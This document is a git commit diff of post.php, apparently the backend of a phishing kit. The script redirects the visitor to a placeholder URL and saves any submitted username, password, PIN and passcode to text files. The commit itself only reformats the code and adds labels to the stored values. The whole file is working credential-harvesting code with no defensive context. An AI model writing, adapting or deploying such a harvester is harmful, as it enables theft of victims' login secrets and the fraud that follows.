9c763a0acc6690648e6473f1270c26e838f3c37b
manjunadha yalam <125998027+manjunathyalam@users.noreply.github.com>
2025-11-25 23:29:13 +0530

    Update post.php

--- post.php
+++ post.php
@@ -2,17 +2,17 @@
 header("Location: forwarding_url");
 
 if (!empty($_POST['username'])) {
-file_put_contents("usernames.txt", " "  . $_POST['username'] . "\n", FILE_APPEND);
+    file_put_contents("usernames.txt", $_POST['username'] . "\n", FILE_APPEND);
 }
 if (!empty($_POST['passwd'])) {
-file_put_contents("passwords.txt", " "   . $_POST['passwd'] . "\n", FILE_APPEND);
+    file_put_contents("passwords.txt", "Password: " . $_POST['passwd'] . "\n", FILE_APPEND);
 }
 if (!empty($_POST['pin'])) {
-file_put_contents("pin.txt", " "   . $_POST['pin'] . "\n", FILE_APPEND);
+    file_put_contents("pin.txt", "PIN: " . $_POST['pin'] . "\n", FILE_APPEND);
 }
 if (!empty($_POST['passcode'])) {
-file_put_contents("passcode.txt", " "   . $_POST['passcode'] . "\n", FILE_APPEND);
- }
+    file_put_contents("passcode.txt", "Passcode: " . $_POST['passcode'] . "\n", FILE_APPEND);
+}
 
 exit();
-
+?>
